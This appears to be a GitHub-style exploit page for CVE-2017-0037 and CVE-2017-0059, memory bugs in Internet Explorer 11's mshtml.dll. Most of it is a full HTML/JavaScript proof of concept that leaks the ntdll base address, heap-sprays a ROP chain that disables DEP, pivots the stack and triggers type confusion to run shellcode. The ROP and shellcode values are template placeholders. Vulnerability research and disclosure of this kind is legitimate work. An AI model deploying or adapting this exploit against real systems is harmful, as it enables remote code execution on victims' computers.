# CVE-2017-0037
* Date : July 2017
* Credit : Google Project Zero

## Description
* Type Confusion Vulnerability in mshtml.dll
* Full exploit below uses CVE-2017-0059, CVE-2017-0037
* CVE-2017-0059 does not work on previous version IE 11.0.9600.17420(11.0.14)
* IE Update is available on www.catalog.update.microsoft.com/search.aspx?q=kb3205394 (update for IE 11.0.9600.18537).
* The bugs are tested only on IE 11.0.9600.18537(11.0.38) on Windows 7

## PoC
```html
<html>
      <head>
          <style>
              .class1 { float: left; column-count: 5; }
              .class2 { column-span: all; columns: 1px; }
              table {border-spacing: 0px;}
          </style>
          <script>
       
          var ntdllBase = "";

           function infoleak() {
           
              var textarea = document.getElementById("textarea");
              var frame = document.createElement("iframe");
              textarea.appendChild(frame);
              frame.contentDocument.onreadystatechange = eventhandler;
              form.reset();  
          }
            
          function eventhandler() {
              document.getElementById("textarea").defaultValue = "foo";
              // Object replaced here
              // one of the side allocations of the audio element
              var j = document.createElement("canvas");
              ctx=j.getContext("2d");
              ctx.beginPath();
              ctx.moveTo(20,20);
              ctx.lineTo(20,100);
              ctx.lineTo(70,100);
              ctx.strokeStyle="red";
              ctx.stroke();              
          }
           
                  
          setTimeout(function() {
              var txt = document.getElementById("textarea");
              var il = txt.value.substring(2,4);
              var addr = parseInt(il.charCodeAt(1).toString(16) + il.charCodeAt(0).toString(16), 16);
              ntdllBase = addr - 0x000d7560;

              //alert("NTDLL base addr is: 0x" + ntdllBase.toString(16));
              spray();
              boom();
          }, 1000); 

          function writeu(base, offs) {
           
              var res = 0;
              if (base != 0) {  res = base + offs }
              else {  res = offs }
              res = res.toString(16);
              while (res.length < 8) res = "0"+res;
              return "%u"+res.substring(4,8)+"%u"+res.substring(0,4);
               
          }

          function spray()
          {
              var hso = document.createElement("div");

              var junk = unescape("%u0e0e%u0e0e");
              while(junk.length < 0x1000) junk += junk;

              //ntdll prefered base addr = 0x77ec0000
              
              //ROP chain built from NTDLL.DLL to disable DEP using VirtualProtect      
              var rop = #{rop_payload};

              //Shellcode

              var shellcode = #{shellcode_payload};

              //stack pivot
              var xchg = #{xchgrop}; //0x77eed801: xchg eax, esp ; retn
              //first stage ROP chain to do bigger stack pivot
              var pivot = #{pivotrop};

              var offset = 0x7c9; //magic number - offset into heap spray to reach addr 0x0e0e0e0e
              var data = junk.substring(0, 0x200) + rop + shellcode + junk.substring(0, offset - 0xd4 - 0x200 - rop.length - shellcode.length) + pivot + junk.substring(0, 0xd4 -pivot.length) + xchg;
              
              data += junk.substring(0, 0x800 - offset - xchg.length);
              while(data.length < 0x80000) data += data;
              for(var i = 0; i < 0x350; i++)
              {
                  var obj = document.createElement("button");
                  obj.title = data.substring(0, (0x7fb00-2)/2);
                  hso.appendChild(obj);
              }

          }
       
          function boom() {
              document.styleSheets[0].media.mediaText = "aaaaaaaaaaaaaaaaaaaa";
              th1.align = "right";
          }
           
          </script>
      </head>
       
      <body onload=infoleak()>
           <form id="form">
              <textarea id="textarea" style="display:none" cols="80">aaaaaaaaaaaaa</textarea>
          </form>
          <table cellspacing="0">
              <tr class="class1">
              <th id="th1" colspan="0" width=2000000></th>
              <th class="class2" width=0><div class="class2"></div></th>
          </table>
      </body>
</html>
```

## Reference
[issue 1011](https://bugs.chromium.org/p/project-zero/issues/detail?id=1011)
[redr2e Github](https://github.com/redr2e/exploits/blob/master/CVE-2017-0037_CVE-2017-0059/index.html)
